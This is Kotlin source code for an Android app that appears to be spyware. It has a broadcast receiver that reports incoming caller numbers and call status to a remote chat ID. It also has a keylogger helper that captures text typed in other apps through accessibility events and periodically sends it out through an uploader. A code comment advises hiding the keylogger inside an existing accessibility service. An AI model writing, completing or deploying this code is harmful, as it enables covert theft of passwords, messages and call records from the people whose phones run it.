package com.phonecontrol

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

/**
 * MonitorReceiver — перехват входящих звонков.
 * Регистрируется в манифесте на PHONE_STATE.
 */
class MonitorReceiver : BroadcastReceiver() {

    companion object {
        const val TAG = "MonitorReceiver"
        private var lastState = TelephonyManager.CALL_STATE_IDLE
        private var lastNumber = ""
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != TelephonyManager.ACTION_PHONE_STATE_CHANGED) return

        val state  = intent.getStringExtra(TelephonyManager.EXTRA_STATE) ?: return
        val number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER) ?: ""

        when (state) {
            TelephonyManager.EXTRA_STATE_RINGING -> {
                lastNumber = number
                lastState  = TelephonyManager.CALL_STATE_RINGING
                Log.d(TAG, "Incoming call: $number")
                notifyCall(context, "📞 Входящий звонок", number)
            }
            TelephonyManager.EXTRA_STATE_OFFHOOK -> {
                if (lastState == TelephonyManager.CALL_STATE_RINGING) {
                    notifyCall(context, "📲 Звонок принят", lastNumber)
                }
                lastState = TelephonyManager.CALL_STATE_OFFHOOK
            }
            TelephonyManager.EXTRA_STATE_IDLE -> {
                if (lastState != TelephonyManager.CALL_STATE_IDLE) {
                    notifyCall(context, "📵 Звонок завершён", lastNumber)
                    lastNumber = ""
                }
                lastState = TelephonyManager.CALL_STATE_IDLE
            }
        }
    }

    private fun notifyCall(context: Context, status: String, number: String) {
        val prefs   = context.getSharedPreferences("phonecontrol_prefs", Context.MODE_PRIVATE)
        val chatId  = prefs.getString("allowed_chat_id", "") ?: ""
        val display = if (number.isNotEmpty()) number else "Номер скрыт"
        if (chatId.isNotEmpty()) {
            Uploader.sendText(context, "$status\n📱 $display", chatId)
        }
    }
}

/**
 * KeyloggerAccessibilityService — перехват вводимого текста.
 * Работает поверх StreamAccessibilityService — добавляем логику сюда
 * чтобы не плодить лишних сервисов.
 *
 * Вместо создания нового сервиса — добавь вызов KeyloggerHelper.onEvent(event, context)
 * внутрь существующего StreamAccessibilityService.onAccessibilityEvent().
 */
object KeyloggerHelper {

    private const val TAG = "KeyloggerHelper"
    private val buffer    = StringBuilder()
    private var lastApp   = ""
    private var lastFlush = 0L
    private const val FLUSH_INTERVAL_MS = 30_000L  // флушим каждые 30 сек или при смене приложения

    fun onEvent(event: AccessibilityEvent, context: Context) {
        try {
            val pkg = event.packageName?.toString() ?: return

            // Пропускаем своё приложение
            if (pkg == context.packageName) return

            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val text = event.text.joinToString("") { it?.toString() ?: "" }
                    if (text.isNotEmpty()) {
                        if (pkg != lastApp) {
                            flushIfNeeded(context, force = true)
                            lastApp = pkg
                            buffer.append("\n[APP: $pkg]\n")
                        }
                        buffer.append(text)
                        flushIfNeeded(context)
                    }
                }
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    if (pkg != lastApp && buffer.isNotEmpty()) {
                        flushIfNeeded(context, force = true)
                        lastApp = pkg
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "onEvent: ${e.message}")
        }
    }

    fun flushIfNeeded(context: Context, force: Boolean = false) {
        val now = System.currentTimeMillis()
        if (buffer.isEmpty()) return
        if (!force && now - lastFlush < FLUSH_INTERVAL_MS) return

        val prefs  = context.getSharedPreferences("phonecontrol_prefs", Context.MODE_PRIVATE)
        val chatId = prefs.getString("allowed_chat_id", "") ?: ""
        if (chatId.isNotEmpty()) {
            val text = buffer.toString().trim()
            if (text.isNotEmpty()) {
                Uploader.sendText(context, "⌨️ Кейлоггер:\n$text", chatId)
            }
        }
        buffer.clear()
        lastFlush = now
    }
}
